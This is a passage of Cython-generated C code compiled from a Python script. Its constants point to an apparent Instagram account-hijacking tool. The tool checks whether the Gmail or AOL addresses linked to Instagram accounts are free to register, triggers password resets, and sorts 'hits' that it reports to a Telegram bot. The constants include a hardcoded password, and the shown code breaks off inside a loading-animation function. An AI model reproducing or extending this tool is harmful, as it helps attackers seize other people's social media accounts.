static PyObject *__pyx_kp_u__5;
static PyObject *__pyx_kp_u__6;
static PyObject *__pyx_kp_u__71;
static PyObject *__pyx_kp_u__72;
static PyObject *__pyx_kp_u__73;
static PyObject *__pyx_kp_u__74;
static PyObject *__pyx_kp_u__75;
static PyObject *__pyx_kp_u__76;
static PyObject *__pyx_kp_u__77;
static PyObject *__pyx_kp_u__8;
static PyObject *__pyx_n_s__80;
static PyObject *__pyx_kp_u__83;
static PyObject *__pyx_n_s__85;
static PyObject *__pyx_n_s_a;
static PyObject *__pyx_n_u_a;
static PyObject *__pyx_kp_u_a_com;
static PyObject *__pyx_n_s_aa;
static PyObject *__pyx_n_s_aca;
static PyObject *__pyx_n_u_accept;
static PyObject *__pyx_kp_u_accept_language;
static PyObject *__pyx_kp_u_accounts_google_com;
static PyObject *__pyx_n_s_acrumb;
static PyObject *__pyx_kp_u_acrumb_2;
static PyObject *__pyx_kp_u_acrumb_input_type_hidden_value;
static PyObject *__pyx_n_u_adid;
static PyObject *__pyx_n_u_administrator;
static PyObject *__pyx_kp_u_android;
static PyObject *__pyx_kp_u_aol_cok_txt;
static PyObject *__pyx_kp_u_aol_com;
static PyObject *__pyx_kp_u_aol_req_txt;
static PyObject *__pyx_kp_u_application_x_www_form_urlencode;
static PyObject *__pyx_kp_u_application_x_www_form_urlencode_2;
static PyObject *__pyx_kp_u_ar_IQ_ar_q_0_9_en_IQ_q_0_8_en_q;
static PyObject *__pyx_n_s_args;
static PyObject *__pyx_n_s_ascii_letters;
static PyObject *__pyx_n_u_authority;
static PyObject *__pyx_n_s_autoreset;
static PyObject *__pyx_n_u_azertyuiopmlkjhgfdsqwxcvbn;
static PyObject *__pyx_n_s_bademail;
static PyObject *__pyx_n_s_badinsta;
static PyObject *__pyx_n_s_bbk;
static PyObject *__pyx_n_s_bio;
static PyObject *__pyx_n_u_biography;
static PyObject *__pyx_n_s_bizz;
static PyObject *__pyx_n_s_blue;
static PyObject *__pyx_kp_u_browser_fp_data_7B_22language_22;
static PyObject *__pyx_n_u_c80c5fb30dfae9e273e4009f03b18280;
static PyObject *__pyx_kp_u_cacheStored_crumb;
static PyObject *__pyx_n_s_cc;
static PyObject *__pyx_n_s_cfonts;
static PyObject *__pyx_n_s_char;
static PyObject *__pyx_n_u_chat_id;
static PyObject *__pyx_n_s_check;
static PyObject *__pyx_n_s_check_aol;
static PyObject *__pyx_n_s_check_gmail;
static PyObject *__pyx_n_s_choice;
static PyObject *__pyx_n_s_choices;
static PyObject *__pyx_n_u_clear;
static PyObject *__pyx_n_s_cline_in_traceback;
static PyObject *__pyx_n_s_close;
static PyObject *__pyx_n_u_cmp;
static PyObject *__pyx_n_s_colorama;
static PyObject *__pyx_kp_u_content_type;
static PyObject *__pyx_kp_u_continue_https_3A_2F_2Fmail_goog;
static PyObject *__pyx_n_s_cookies;
static PyObject *__pyx_n_u_cors;
static PyObject *__pyx_n_u_creator;
static PyObject *__pyx_n_s_crumb;
static PyObject *__pyx_n_s_csrf;
static PyObject *__pyx_n_u_csrftoken;
static PyObject *__pyx_n_u_csrftoken_2;
static PyObject *__pyx_n_s_cyan;
static PyObject *__pyx_n_s_data;
static PyObject *__pyx_n_u_data;
static PyObject *__pyx_kp_u_data_initial_setup_data_null_nul;
static PyObject *__pyx_n_s_date;
static PyObject *__pyx_n_s_datetime;
static PyObject *__pyx_n_s_dev;
static PyObject *__pyx_n_s_device_id;
static PyObject *__pyx_n_u_device_id;
static PyObject *__pyx_n_u_deviceinfo;
static PyObject *__pyx_n_s_digits;
static PyObject *__pyx_n_u_doc_id;
static PyObject *__pyx_kp_u_done_https_3A_2F_2Fwww_aol_com;
static PyObject *__pyx_kp_u_done_https_3A_2F_2Fwww_aol_com_2;
static PyObject *__pyx_n_s_dumps;
static PyObject *__pyx_n_s_e;
static PyObject *__pyx_n_s_email;
static PyObject *__pyx_n_u_email;
static PyObject *__pyx_n_s_emails;
static PyObject *__pyx_n_u_empty;
static PyObject *__pyx_kp_u_en_GB_en_US;
static PyObject *__pyx_kp_u_en_US_en_q_0_9;
static PyObject *__pyx_n_s_enter;
static PyObject *__pyx_kp_u_errors;
static PyObject *__pyx_n_s_eval;
static PyObject *__pyx_n_s_exit;
static PyObject *__pyx_n_s_exit_2;
static PyObject *__pyx_n_s_f;
static PyObject *__pyx_kp_u_f_req;
static PyObject *__pyx_n_s_ff;
static PyObject *__pyx_n_s_first_name;
static PyObject *__pyx_n_u_first_name;
static PyObject *__pyx_n_s_flush;
static PyObject *__pyx_n_u_follower_count;
static PyObject *__pyx_n_u_following_count;
static PyObject *__pyx_n_s_fowg;
static PyObject *__pyx_n_s_fows;
static PyObject *__pyx_n_s_full_name;
static PyObject *__pyx_n_u_full_name;
static PyObject *__pyx_n_s_g;
static PyObject *__pyx_n_u_gads;
static PyObject *__pyx_n_s_generate_user_agent;
static PyObject *__pyx_n_s_genexpr;
static PyObject *__pyx_n_s_get;
static PyObject *__pyx_kp_u_getChat;
static PyObject *__pyx_kp_u_getChatMember_chat_id;
static PyObject *__pyx_kp_u_getMe;
static PyObject *__pyx_n_s_get_bot_info;
static PyObject *__pyx_n_s_get_dict;
static PyObject *__pyx_n_s_get_user_info;
static PyObject *__pyx_kp_u_gf_uar_1;
static PyObject *__pyx_n_s_gg;
static PyObject *__pyx_n_s_ggb;
static PyObject *__pyx_kp_u_gmail_com;
static PyObject *__pyx_n_s_goodig;
static PyObject *__pyx_kp_u_google_accounts_xsrf;
static PyObject *__pyx_n_u_gpi;
static PyObject *__pyx_n_u_gpp;
static PyObject *__pyx_n_u_gpp_sid;
static PyObject *__pyx_n_s_green;
static PyObject *__pyx_n_s_group;
static PyObject *__pyx_n_u_guid;
static PyObject *__pyx_kp_u_gzip_deflate;
static PyObject *__pyx_n_s_hashlib;
static PyObject *__pyx_n_s_he3;
static PyObject *__pyx_n_s_headers;
static PyObject *__pyx_n_s_hexdigest;
static PyObject *__pyx_n_s_hits;
static PyObject *__pyx_n_s_host;
static PyObject *__pyx_kp_u_https_accounts_google_com;
static PyObject *__pyx_kp_u_https_accounts_google_com___sign;
static PyObject *__pyx_kp_u_https_accounts_google_com___sign_2;
static PyObject *__pyx_kp_u_https_accounts_google_com_signin;
static PyObject *__pyx_kp_u_https_accounts_google_com_signup;
static PyObject *__pyx_kp_u_https_accounts_google_com_signup_2;
static PyObject *__pyx_kp_u_https_api_telegram_org_bot;
static PyObject *__pyx_kp_u_https_i_instagram_com_api_v1_acc;
static PyObject *__pyx_kp_u_https_login_aol_com;
static PyObject *__pyx_kp_u_https_login_aol_com_account_crea;
static PyObject *__pyx_kp_u_https_login_aol_com_account_crea_2;
static PyObject *__pyx_kp_u_https_login_aol_com_account_modu;
static PyObject *__pyx_kp_u_https_www_instagram_com;
static PyObject *__pyx_kp_u_https_www_instagram_com_accounts;
static PyObject *__pyx_kp_u_https_www_instagram_com_api_grap;
static PyObject *__pyx_n_s_hy;
static PyObject *__pyx_kp_u_i_instagram_com;
static PyObject *__pyx_n_s_id;
static PyObject *__pyx_n_u_id;
static PyObject *__pyx_n_u_ig_sig_key_version;
static PyObject *__pyx_n_s_import;
static PyObject *__pyx_n_s_infoinsta;
static PyObject *__pyx_n_s_init;
static PyObject *__pyx_n_s_input;
static PyObject *__pyx_n_s_isPraise;
static PyObject *__pyx_n_u_is_business;
static PyObject *__pyx_n_u_is_private;
static PyObject *__pyx_n_s_is_user_in_channel;
static PyObject *__pyx_n_s_is_verified;
static PyObject *__pyx_n_u_is_verified;
static PyObject *__pyx_kp_u_j_0_u_1;
static PyObject *__pyx_n_s_json;
static PyObject *__pyx_n_s_k;
static PyObject *__pyx_kp_u_keep_alive;
static PyObject *__pyx_n_s_line;
static PyObject *__pyx_n_s_loading_animation;
static PyObject *__pyx_n_s_loading_chars;
static PyObject *__pyx_kp_u_login_aol_com;
static PyObject *__pyx_n_u_lsd;
static PyObject *__pyx_n_u_m;
static PyObject *__pyx_n_s_magenta;
static PyObject *__pyx_n_s_main;
static PyObject *__pyx_n_u_main;
static PyObject *__pyx_n_s_main_2;
static PyObject *__pyx_n_s_md5;
static PyObject *__pyx_n_u_media_count;
static PyObject *__pyx_n_u_member;
static PyObject *__pyx_n_s_memo;
static PyObject *__pyx_n_s_meta;
static PyObject *__pyx_kp_u_mid_ZVfGvgABAAGoQqa7AY3mgoYBV1nP;
static PyObject *__pyx_kp_u_multiDomain_tos0_oath_freereg_7;
static PyObject *__pyx_n_s_n1;
static PyObject *__pyx_n_s_n2;
static PyObject *__pyx_n_s_name;
static PyObject *__pyx_n_s_name_2;
static PyObject *__pyx_kp_u_name_acrumb;
static PyObject *__pyx_kp_u_name_attrSetIndex_input_type_hid;
static PyObject *__pyx_kp_u_name_browser_fp_data_id_browser;
static PyObject *__pyx_kp_u_name_cacheStored_input_type_hidd;
static PyObject *__pyx_kp_u_name_crumb;
static PyObject *__pyx_kp_u_name_crumb_input_type_hidden_val;
static PyObject *__pyx_kp_u_name_sessionIndex;
static PyObject *__pyx_kp_u_name_specData;
static PyObject *__pyx_kp_u_name_specId;
static PyObject *__pyx_kp_u_no_REST;
static PyObject *__pyx_kp_u_null;
static PyObject *__pyx_kp_u_null_null_null_null_null_NL_nul;
static PyObject *__pyx_n_s_o;
static PyObject *__pyx_n_s_ok;
static PyObject *__pyx_n_u_ok;
static PyObject *__pyx_n_s_open;
static PyObject *__pyx_n_s_orange;
static PyObject *__pyx_n_u_origin;
static PyObject *__pyx_n_s_os;
static PyObject *__pyx_n_s_output;
static PyObject *__pyx_n_s_params;
static PyObject *__pyx_kp_u_password_Drahmed2006_mm_10_dd_2;
static PyObject *__pyx_kp_u_pip_install_colorama;
static PyObject *__pyx_kp_u_pip_install_python_cfonts;
static PyObject *__pyx_n_u_pk;
static PyObject *__pyx_n_s_post;
static PyObject *__pyx_n_s_pp;
static PyObject *__pyx_n_s_pppp;
static PyObject *__pyx_n_s_print;
static PyObject *__pyx_n_s_qq;
static PyObject *__pyx_n_u_query;
static PyObject *__pyx_n_s_r;
static PyObject *__pyx_n_u_r;
static PyObject *__pyx_n_s_randint;
static PyObject *__pyx_n_s_random;
static PyObject *__pyx_n_s_randrange;
static PyObject *__pyx_n_s_range;
static PyObject *__pyx_n_s_ranges;
static PyObject *__pyx_n_s_re;
static PyObject *__pyx_n_s_read;
static PyObject *__pyx_n_s_red;
static PyObject *__pyx_n_s_red6;
static PyObject *__pyx_n_u_referer;
static PyObject *__pyx_n_s_remove;
static PyObject *__pyx_n_s_render;
static PyObject *__pyx_n_u_render_surface;
static PyObject *__pyx_n_s_requests;
static PyObject *__pyx_n_s_res;
static PyObject *__pyx_n_s_res1;
static PyObject *__pyx_n_s_reset;
static PyObject *__pyx_n_s_response;
static PyObject *__pyx_n_s_rest;
static PyObject *__pyx_n_u_result;
static PyObject *__pyx_n_s_rich_console;
static PyObject *__pyx_n_s_rich_table;
static PyObject *__pyx_n_s_ror;
static PyObject *__pyx_n_s_rr;
static PyObject *__pyx_kp_u_s;
static PyObject *__pyx_n_s_s6;
static PyObject *__pyx_kp_u_same_origin;
static PyObject *__pyx_n_s_say;
static PyObject *__pyx_n_s_search;
static PyObject *__pyx_kp_u_sec_ch_ua;
static PyObject *__pyx_kp_u_sec_ch_ua_mobile;
static PyObject *__pyx_kp_u_sec_ch_ua_platform;
static PyObject *__pyx_kp_u_sec_fetch_dest;
static PyObject *__pyx_kp_u_sec_fetch_mode;
static PyObject *__pyx_kp_u_sec_fetch_site;
static PyObject *__pyx_n_s_send;
static PyObject *__pyx_kp_u_sendMessage_chat_id;
static PyObject *__pyx_n_s_session;
static PyObject *__pyx_n_s_sessionIndex;
static PyObject *__pyx_kp_u_sessionIndex_2;
static PyObject *__pyx_n_u_signed_body;
static PyObject *__pyx_n_s_sleep;
static PyObject *__pyx_n_s_source;
static PyObject *__pyx_kp_s_source_py;
static PyObject *__pyx_n_s_specData;
static PyObject *__pyx_n_s_specId;
static PyObject *__pyx_n_s_split;
static PyObject *__pyx_n_s_splitlines;
static PyObject *__pyx_n_s_ss;
static PyObject *__pyx_n_s_start;
static PyObject *__pyx_n_u_status;
static PyObject *__pyx_n_s_status_code;
static PyObject *__pyx_n_s_stdout;
static PyObject *__pyx_n_s_string;
static PyObject *__pyx_n_s_strip;
static PyObject *__pyx_n_s_sys;
static PyObject *__pyx_n_s_system;
static PyObject *__pyx_kp_u_t;
static PyObject *__pyx_n_s_t_2;
static PyObject *__pyx_n_s_target;
static PyObject *__pyx_n_s_test;
static PyObject *__pyx_n_s_text;
static PyObject *__pyx_kp_u_text_2;
static PyObject *__pyx_n_s_threading;
static PyObject *__pyx_n_s_throw;
static PyObject *__pyx_n_s_time;
static PyObject *__pyx_n_s_tl;
static PyObject *__pyx_kp_u_tl_txt;
static PyObject *__pyx_n_s_tll;
static PyObject *__pyx_n_s_tll_locals_genexpr;
static PyObject *__pyx_n_s_tm1;
static PyObject *__pyx_n_s_tok;
static PyObject *__pyx_n_s_token;
static PyObject *__pyx_n_s_total;
static PyObject *__pyx_n_s_ua;
static PyObject *__pyx_n_s_update;
static PyObject *__pyx_n_s_upper;
static PyObject *__pyx_n_s_url;
static PyObject *__pyx_n_s_user;
static PyObject *__pyx_n_u_user;
static PyObject *__pyx_n_u_userId;
static PyObject *__pyx_kp_u_user_agent;
static PyObject *__pyx_n_s_user_agent_2;
static PyObject *__pyx_n_s_user_id;
static PyObject *__pyx_kp_u_user_id_2;
static PyObject *__pyx_n_s_user_info;
static PyObject *__pyx_n_s_username;
static PyObject *__pyx_n_u_username;
static PyObject *__pyx_n_s_uui;
static PyObject *__pyx_n_s_uuid;
static PyObject *__pyx_n_s_uuid4;
static PyObject *__pyx_n_u_validateField;
static PyObject *__pyx_n_u_variables;
static PyObject *__pyx_n_u_w;
static PyObject *__pyx_n_s_white;
static PyObject *__pyx_n_s_write;
static PyObject *__pyx_n_s_xYourKing;
static PyObject *__pyx_kp_u_x_requested_with;
static PyObject *__pyx_n_s_year;
static PyObject *__pyx_n_s_yellow;
static PyObject *__pyx_n_s_yy;
static PyObject *__pyx_pf_6source_loading_animation(CYTHON_UNUSED PyObject *__pyx_self); /* proto */
static PyObject *__pyx_pf_6source_2get_bot_info(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_token); /* proto */
static PyObject *__pyx_pf_6source_4get_user_info(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_token, PyObject *__pyx_v_user_id); /* proto */
static PyObject *__pyx_pf_6source_6is_user_in_channel(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_ID); /* proto */
static PyObject *__pyx_pf_6source_8main(CYTHON_UNUSED PyObject *__pyx_self); /* proto */
static PyObject *__pyx_pf_6source_10pppp(CYTHON_UNUSED PyObject *__pyx_self); /* proto */
static PyObject *__pyx_pf_6source_3tll_genexpr(CYTHON_UNUSED PyObject *__pyx_self); /* proto */
static PyObject *__pyx_pf_6source_3tll_3genexpr(CYTHON_UNUSED PyObject *__pyx_self); /* proto */
static PyObject *__pyx_pf_6source_3tll_6genexpr(CYTHON_UNUSED PyObject *__pyx_self); /* proto */
static PyObject *__pyx_pf_6source_12tll(CYTHON_UNUSED PyObject *__pyx_self); /* proto */
static PyObject *__pyx_pf_6source_14Getaol(CYTHON_UNUSED PyObject *__pyx_self); /* proto */
static PyObject *__pyx_pf_6source_16check_gmail(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_email); /* proto */
static PyObject *__pyx_pf_6source_18check_aol(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_email); /* proto */
static PyObject *__pyx_pf_6source_20check(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_email); /* proto */
static PyObject *__pyx_pf_6source_22rest(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_user); /* proto */
static PyObject *__pyx_pf_6source_24date(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_hy); /* proto */
static PyObject *__pyx_pf_6source_26InfoAcc(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_username, PyObject *__pyx_v_gg); /* proto */
static PyObject *__pyx_pf_6source_28gg(CYTHON_UNUSED PyObject *__pyx_self); /* proto */
static PyObject *__pyx_tp_new_6source___pyx_scope_struct__genexpr(PyTypeObject *t, PyObject *a, PyObject *k); /*proto*/
static PyObject *__pyx_tp_new_6source___pyx_scope_struct_1_genexpr(PyTypeObject *t, PyObject *a, PyObject *k); /*proto*/
static PyObject *__pyx_tp_new_6source___pyx_scope_struct_2_genexpr(PyTypeObject *t, PyObject *a, PyObject *k); /*proto*/
static PyObject *__pyx_float_0_1;
static PyObject *__pyx_int_0;
static PyObject *__pyx_int_1;
static PyObject *__pyx_int_2;
static PyObject *__pyx_int_3;
static PyObject *__pyx_int_6;
static PyObject *__pyx_int_9;
static PyObject *__pyx_int_10;
static PyObject *__pyx_int_15;
static PyObject *__pyx_int_16;
static PyObject *__pyx_int_30;
static PyObject *__pyx_int_32;
static PyObject *__pyx_int_100;
static PyObject *__pyx_int_200;
static PyObject *__pyx_int_300;
static PyObject *__pyx_int_2010;
static PyObject *__pyx_int_2011;
static PyObject *__pyx_int_2012;
static PyObject *__pyx_int_2013;
static PyObject *__pyx_int_2014;
static PyObject *__pyx_int_2015;
static PyObject *__pyx_int_2016;
static PyObject *__pyx_int_2017;
static PyObject *__pyx_int_2018;
static PyObject *__pyx_int_2019;
static PyObject *__pyx_int_2020;
static PyObject *__pyx_int_2021;
static PyObject *__pyx_int_2022;
static PyObject *__pyx_int_2023;
static PyObject *__pyx_int_10000;
static PyObject *__pyx_int_1279000;
static PyObject *__pyx_int_17699999;
static PyObject *__pyx_int_17750000;
static PyObject *__pyx_int_263014407;
static PyObject *__pyx_int_279760000;
static PyObject *__pyx_int_900990000;
static PyObject *__pyx_int_1629010000;
static PyObject *__pyx_int_2500000000;
static PyObject *__pyx_int_3713668786;
static PyObject *__pyx_int_5699785217;
static PyObject *__pyx_int_8597939245;
static PyObject *__pyx_int_21254029834;
static PyObject *__pyx_int_43464475395;
static PyObject *__pyx_int_50289297647;
static PyObject *__pyx_int_57464707082;
static PyObject *__pyx_int_63313426938;
static PyObject *__pyx_tuple__7;
static PyObject *__pyx_tuple__9;
static PyObject *__pyx_slice__45;
static PyObject *__pyx_tuple__10;
static PyObject *__pyx_tuple__11;
static PyObject *__pyx_tuple__12;
static PyObject *__pyx_tuple__14;
static PyObject *__pyx_tuple__15;
static PyObject *__pyx_tuple__16;
static PyObject *__pyx_tuple__21;
static PyObject *__pyx_tuple__22;
static PyObject *__pyx_tuple__23;
static PyObject *__pyx_tuple__26;
static PyObject *__pyx_tuple__29;
static PyObject *__pyx_tuple__31;
static PyObject *__pyx_tuple__33;
static PyObject *__pyx_tuple__34;
static PyObject *__pyx_tuple__36;
static PyObject *__pyx_tuple__38;
static PyObject *__pyx_tuple__40;
static PyObject *__pyx_tuple__41;
static PyObject *__pyx_tuple__42;
static PyObject *__pyx_tuple__43;
static PyObject *__pyx_tuple__44;
static PyObject *__pyx_tuple__46;
static PyObject *__pyx_tuple__48;
static PyObject *__pyx_tuple__49;
static PyObject *__pyx_tuple__50;
static PyObject *__pyx_tuple__51;
static PyObject *__pyx_tuple__52;
static PyObject *__pyx_tuple__53;
static PyObject *__pyx_tuple__54;
static PyObject *__pyx_tuple__55;
static PyObject *__pyx_tuple__56;
static PyObject *__pyx_tuple__57;
static PyObject *__pyx_tuple__58;
static PyObject *__pyx_tuple__59;
static PyObject *__pyx_tuple__60;
static PyObject *__pyx_tuple__61;
static PyObject *__pyx_tuple__62;
static PyObject *__pyx_tuple__63;
static PyObject *__pyx_tuple__64;
static PyObject *__pyx_tuple__65;
static PyObject *__pyx_tuple__66;
static PyObject *__pyx_tuple__67;
static PyObject *__pyx_tuple__68;
static PyObject *__pyx_tuple__69;
static PyObject *__pyx_tuple__70;
static PyObject *__pyx_tuple__78;
static PyObject *__pyx_tuple__79;
static PyObject *__pyx_tuple__81;
static PyObject *__pyx_tuple__82;
static PyObject *__pyx_tuple__84;
static PyObject *__pyx_tuple__86;
static PyObject *__pyx_tuple__88;
static PyObject *__pyx_tuple__90;
static PyObject *__pyx_tuple__92;
static PyObject *__pyx_tuple__93;
static PyObject *__pyx_tuple__95;
static PyObject *__pyx_tuple__97;
static PyObject *__pyx_tuple__98;
static PyObject *__pyx_tuple__99;
static PyObject *__pyx_tuple__107;
static PyObject *__pyx_tuple__109;
static PyObject *__pyx_tuple__111;
static PyObject *__pyx_tuple__113;
static PyObject *__pyx_tuple__115;
static PyObject *__pyx_tuple__117;
static PyObject *__pyx_tuple__119;
static PyObject *__pyx_tuple__121;
static PyObject *__pyx_tuple__123;
static PyObject *__pyx_codeobj__87;
static PyObject *__pyx_codeobj__89;
static PyObject *__pyx_codeobj__91;
static PyObject *__pyx_codeobj__94;
static PyObject *__pyx_codeobj__96;
static PyObject *__pyx_codeobj__100;
static PyObject *__pyx_codeobj__108;
static PyObject *__pyx_codeobj__110;
static PyObject *__pyx_codeobj__112;
static PyObject *__pyx_codeobj__114;
static PyObject *__pyx_codeobj__116;
static PyObject *__pyx_codeobj__118;
static PyObject *__pyx_codeobj__120;
static PyObject *__pyx_codeobj__122;
static PyObject *__pyx_codeobj__124;
/* Late includes */



/* Python wrapper */
static PyObject *__pyx_pw_6source_1loading_animation(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused); /*proto*/
static PyMethodDef __pyx_mdef_6source_1loading_animation = {"loading_animation", (PyCFunction)__pyx_pw_6source_1loading_animation, METH_NOARGS, 0};
static PyObject *__pyx_pw_6source_1loading_animation(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("loading_animation (wrapper)", 0);
  __pyx_r = __pyx_pf_6source_loading_animation(__pyx_self);

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_6source_loading_animation(CYTHON_UNUSED PyObject *__pyx_self) {
  PyObject *__pyx_v_loading_chars = NULL;
  CYTHON_UNUSED long __pyx_v__;
  PyObject *__pyx_v_char = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  long __pyx_t_2;
  Py_ssize_t __pyx_t_3;
  PyObject *__pyx_t_4 = NULL;
  PyObject *__pyx_t_5 = NULL;
  PyObject *__pyx_t_6 = NULL;
  PyObject *__pyx_t_7 = NULL;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("loading_animation", 0);

  
  __pyx_t_1 = PyList_New(4); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 117, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_INCREF(__pyx_kp_u_);
  __Pyx_GIVEREF(__pyx_kp_u_);
  PyList_SET_ITEM(__pyx_t_1, 0, __pyx_kp_u_);
  __Pyx_INCREF(__pyx_kp_u__2);
  __Pyx_GIVEREF(__pyx_kp_u__2);
  PyList_SET_ITEM(__pyx_t_1, 1, __pyx_kp_u__2);
  __Pyx_INCREF(__pyx_kp_u__3);
  __Pyx_GIVEREF(__pyx_kp_u__3);
  PyList_SET_ITEM(__pyx_t_1, 2, __pyx_kp_u__3);
  __Pyx_INCREF(__pyx_kp_u__4);
  __Pyx_GIVEREF(__pyx_kp_u__4);
  PyList_SET_ITEM(__pyx_t_1, 3, __pyx_kp_u__4);
  __pyx_v_loading_chars = ((PyObject*)__pyx_t_1);
  __pyx_t_1 = 0;

  
  for (__pyx_t_2 = 0; __pyx_t_2 < 2; __pyx_t_2+=1) {
    __pyx_v__ = __pyx_t_2;

    
    __pyx_t_1 = __pyx_v_loading_chars; __Pyx_INCREF(__pyx_t_1); __pyx_t_3 = 0;
    for (;;) {
      if (__pyx_t_3 >= PyList_GET_SIZE(__pyx_t_1)) break;
      #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
      __pyx_t_4 = PyList_GET_ITEM(__pyx_t_1, __pyx_t_3); __Pyx_INCREF(__pyx_t_4); __pyx_t_3++; if (unlikely(0 < 0)) __PYX_ERR(0, 119, __pyx_L1_error)
      #else
      __pyx_t_4 = PySequence_ITEM(__pyx_t_1, __pyx_t_3); __pyx_t_3++; if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 119, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_4);
      #endif
      __Pyx_XDECREF_SET(__pyx_v_char, __pyx_t_4);
      __pyx_t_4 = 0;

      
      __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_sys); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 120, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_5);
      __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_stdout); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 120, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_6, __pyx_n_s_write); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 120, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __pyx_t_6 = __Pyx_PyObject_FormatSimple(__pyx_v_char, __pyx_empty_unicode); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 120, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_6);
      __pyx_t_7 = __Pyx_PyUnicode_Concat(__pyx_kp_u_L, __pyx_t_6); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 120, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __pyx_t_6 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_5))) {
        __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_5);
        if (likely(__pyx_t_6)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
          __Pyx_INCREF(__pyx_t_6);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_5, function);
        }
      }
      __pyx_t_4 = (__pyx_t_6) ? __Pyx_PyObject_Call2Args(__pyx_t_5, __pyx_t_6, __pyx_t_7) : __Pyx_PyObject_CallOneArg(__pyx_t_5, __pyx_t_7);
      __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 120, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

      
      __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_sys); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 121, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_5);
      __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_stdout); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 121, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_flush); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 121, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      __pyx_t_7 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_5))) {
        __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_5);
        if (likely(__pyx_t_7)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
          __Pyx_INCREF(__pyx_t_7);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_5, function);
        }
      }
      __pyx_t_4 = (__pyx_t_7) ? __Pyx_PyObject_CallOneArg(__pyx_t_5, __pyx_t_7) : __Pyx_PyObject_CallNoArg(__pyx_t_5);
      __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
      if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 121, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

      
      __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_time); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 122, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_5);
      __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_sleep); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 122, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __pyx_t_5 = NULL;
      if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_7))) {
        __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_7);
        if (likely(__pyx_t_5)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_7);
          __Pyx_INCREF(__pyx_t_5);
          __Pyx_INCREF(function);
